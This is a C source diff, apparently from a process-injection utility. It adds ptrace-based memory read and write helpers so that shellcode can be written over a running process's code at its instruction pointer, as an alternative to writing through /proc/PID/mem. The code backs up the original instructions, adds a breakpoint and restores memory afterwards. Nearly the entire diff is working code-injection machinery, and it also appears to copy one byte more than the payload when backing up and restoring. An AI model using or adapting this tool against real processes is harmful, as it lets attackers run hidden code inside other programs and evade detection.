@@ -21,7 +21,49 @@ inline long setip(pid_t pid, long ip){
 	return ptrace(PTRACE_POKEUSER, pid, sizeof(long)*IP, ip);
 }
 
-void ps_inject(const char *sc, size_t len, mypid_t pid, int save){
+void ptrace_write(pid_t pid, long addr, const void *data, size_t len){
+	size_t i;
+	long word, old;
+	int final_size;
+
+	for(i=0; i<len; i+=wordsize){
+		if((i+wordsize) > len){
+			final_size = len-i;
+			word = 0;
+
+			memcpy(&word, data+i, final_size);
+			old = ptrace(PTRACE_PEEKDATA, pid, addr+i, 0L);
+			old &= (unsigned long)-1 << (8*final_size);
+			word |= old;
+			ptrace(PTRACE_POKEDATA, pid, addr+i, word);
+
+		} else {
+			word = *(long *)(data+i);
+			ptrace(PTRACE_POKEDATA, pid, addr+i, word);
+		}
+	}
+}
+
+
+void ptrace_read(pid_t pid, long addr, void *output, size_t n){
+	size_t i;
+	long bytes;
+
+
+	for(i=0; i<n; i+=wordsize){
+		bytes = ptrace(PTRACE_PEEKDATA, pid, addr+i, 0L);
+		printf("ptrace_read: %zx\n", bytes);
+		if((i+wordsize) > n){
+			memcpy((output+i), &bytes, n-i);
+		} else {
+			*(long *)(output+i) = bytes;
+		}
+	}
+
+}
+
+
+void ps_inject(const char *sc, size_t len, mypid_t pid, int save, int use_ptrace){
 	char *instructions_backup, memfile[100];
 	int status, memfd;
 	long instruction_point;
@@ -32,31 +74,39 @@ void ps_inject(const char *sc, size_t len, mypid_t pid, int save){
 
 	instruction_point = getip(pid.number);
 
-	info("opening /proc/%s/mem\n", pid.str);
-	snprintf(memfile, sizeof(memfile), "/proc/%s/mem", pid.str);
-
-	memfd = xopen(memfile, O_RDWR);
-	good("sucess\n");
+	if(!use_ptrace){
+		info("opening /proc/%s/mem\n", pid.str);
+		snprintf(memfile, sizeof(memfile), "/proc/%s/mem", pid.str);
+		memfd = xopen(memfile, O_RDWR);
+		good("sucess\n");
+	}
 
 	if(save){
 		instructions_backup = xmalloc(len);
 		info("backup previously instructions\n");
-		pread(memfd, instructions_backup, len+1, instruction_point);
+
+		(use_ptrace) ? 	ptrace_read(pid.number, instruction_point, instructions_backup, len+1) :
+				pread(memfd, instructions_backup, len+1, instruction_point);
 	}
 
 	info("writing shellcode on memory\n");
-	pwrite(memfd, sc, len, instruction_point);
+
+	(use_ptrace) ? 	ptrace_write(pid.number, instruction_point, sc, len) :
+			pwrite(memfd, sc, len, instruction_point);
+
 	good("Shellcode inject !!!\n");
 
 	if(save){
 		info("resuming application ...\n");
-		pwrite(memfd, "\xcc", 1, instruction_point+len);
+		(use_ptrace) ? 	ptrace_write(pid.number, instruction_point+len, "\xcc", 1) :
+				pwrite(memfd, "\xcc", 1, instruction_point+len);
 
 		ptrace(PTRACE_CONT, pid.number, NULL, 0);
 		waitpid(pid.number, &status, 0);
 
 		info("restoring memory instructions\n");
-		pwrite(memfd, instructions_backup, len+1, instruction_point);
+		(use_ptrace) ? 	ptrace_write(pid.number, instruction_point, instructions_backup, len+1) :
+				pwrite(memfd, instructions_backup, len+1, instruction_point);
 
 		xfree(instructions_backup);
 
